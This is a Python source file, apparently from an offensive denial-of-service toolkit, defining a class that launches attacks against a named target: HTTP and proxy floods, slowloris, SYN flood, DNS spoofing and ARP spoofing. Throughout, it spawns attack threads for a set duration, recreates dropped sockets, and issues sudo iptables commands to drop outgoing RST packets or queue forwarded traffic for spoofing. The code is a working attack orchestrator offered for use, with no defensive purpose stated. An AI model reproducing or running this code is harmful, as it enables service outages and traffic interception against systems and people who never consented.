"""This module provides a class to instantiate DoS attacks."""

from __future__ import annotations

import os
import socket
import sys
from threading import Thread
from time import sleep, time
from typing import Dict, Iterator, List, Tuple, Union

from colorama import Fore as F
from humanfriendly import Spinner, format_timespan

from tools.addons.ip_tools import get_host_ip, get_target_address
from tools.addons.sockets import create_socket, create_socket_proxy

L7_METHODS = ["http", "http-proxy", "slowloris", "slowloris-proxy", "dns-spoof"]
L4_METHODS = ["syn-flood"]
L2_METHODS = ["arp-spoof"]


class AttackMethod:
    """Control the attack's inner operations."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        sleep_time: int = 15,
    ):
        """Initialize the attack object.

        Args:
            - method_name - The name of the DoS method used to attack
            - duration - The duration of the attack, in seconds
            - threads - The number of threads that will attack the target
            - target - The target's URL
            - sleep_time - The sleeping time of the sockets (Slowloris only)
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.sleep_time = sleep_time
        self.threads: List[Thread]
        self.threads = []
        self.is_running = False

    def get_method_by_name(self) -> None:
        """Get the flood function based on the attack method.

        Args:
            None

        Returns:
            None
        """
        if self.method_name in L7_METHODS:
            layer_number = 7
        elif self.method_name in L4_METHODS:
            layer_number = 4
        elif self.method_name in L2_METHODS:
            layer_number = 2
        directory = f"tools.L{layer_number}.{self.method_name}"
        module = __import__(directory, fromlist=["object"])
        self.method = getattr(module, "flood")

    def fill_tables(self) -> None:
        if self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
        elif self.method_name == "dns-spoof":
            from netfilterqueue import NetfilterQueue

            os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 1")
            self.queue = NetfilterQueue()
            self.queue.bind(1, self.method)

    def __enter__(self) -> AttackMethod:
        """Set the flood function, fill iptables and format the target."""
        self.get_method_by_name()
        self.fill_tables()
        if self.method_name not in ["arp-spoof", "dns-spoof"]:
            self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:
        """Drop any rule that were added to iptables."""
        if self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
        if self.method_name == "dns-spoof":
            os.system(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")

    def __run_timer(self) -> None:
        """Verify the execution time every second."""
        __stop_time = time() + self.duration
        while time() < __stop_time:
            sleep(1)
        self.is_running = False

    def __slow_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Run slowloris and slowloris-proxy attack methods."""
        if self.method_name == "slowloris-proxy":
            try:
                self.method(args[0], args[1])
            except (ConnectionResetError, BrokenPipeError):
                self.thread = Thread(
                    target=self.__run_flood, args=create_socket_proxy(self.target)
                )
                self.thread.start()
        elif self.method_name == "slowloris":
            try:
                self.method(args[0])
            except (ConnectionResetError, BrokenPipeError):
                self.thread = Thread(
                    target=self.__run_flood, args=(create_socket(self.target),)
                )
                self.thread.start()
        sleep(self.sleep_time)

    def __run_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Start the flooder."""
        while self.is_running:

            # Methods that carry objects to the flood function
            if self.method_name in ["slowloris", "slowloris-proxy"]:
                self.__slow_flood(*args)

            # Methods that process packets before sending them
            elif self.method_name in ["dns-spoof"]:
                print(
                    f"{F.MAGENTA} [!] {F.GREEN}{self.target}{F.RESET} is now being {F.RED}DNS-SPOOFED{F.RESET}\n"
                )
                self.queue.run()

            # Methods that use the default behavior of threading attack
            else:
                self.method(self.target)

    def __slow_threads(self) -> Iterator[Thread]:
        """Initialize the threads for slowloris and slowloris-proxy attacks."""
        with Spinner(
            label=f"{F.YELLOW}Creating {self.threads_count} Socket(s)...{F.RESET}",
            total=100,
        ) as spinner:
            for index in range(self.threads_count):
                if self.method_name == "slowloris-proxy":
                    yield Thread(
                        target=self.__run_flood, args=create_socket_proxy(self.target)
                    )
                elif self.method_name == "slowloris":
                    yield Thread(
                        target=self.__run_flood, args=(create_socket(self.target),)
                    )
                spinner.step(100 / self.threads_count * (index + 1))

    def __start_threads(self) -> None:
        """Start the threads."""
        with Spinner(
            label=f"{F.YELLOW}Starting {self.threads_count} Thread(s){F.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                self.thread = thread
                self.thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

    def __run_threads(self) -> None:
        """Initialize the threads and start them."""
        if self.method_name in ["slowloris", "slowloris-proxy"]:
            self.threads = list(self.__slow_threads())
        else:
            self.threads = [
                Thread(target=self.__run_flood) for _ in range(self.threads_count)
            ]

        self.__start_threads()

        # Timer starts counting after all threads were started.
        Thread(target=self.__run_timer).start()

        # Close all threads after the attack is completed.
        for thread in self.threads:
            thread.join()

        print(f"{F.MAGENTA}\n\n[!] {F.BLUE}Attack Completed!\n\n{F.RESET}")

    def start(self) -> None:
        """Start the DoS attack itself."""
        duration = format_timespan(self.duration)

        print(
            f"{F.MAGENTA}\n [!] {F.BLUE}Attacking {F.MAGENTA}{self.target}{F.BLUE} using "
            f"{F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
            f" [!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
        )
        if self.method_name in ["slowloris", "slowloris-proxy"]:
            print(
                f"{F.MAGENTA} [!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
            )
        elif self.method_name == "http-proxy":
            print(
                f"{F.MAGENTA} [!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
            )

        self.is_running = True

        try:
            self.__run_threads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"{F.RED}\n\n[!] {F.MAGENTA}Ctrl+C detected. Stopping Attack...{F.RESET}"
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(f"{F.MAGENTA}\n[!] {F.BLUE}Attack Interrupted!\n\n{F.RESET}")
            sys.exit(1)
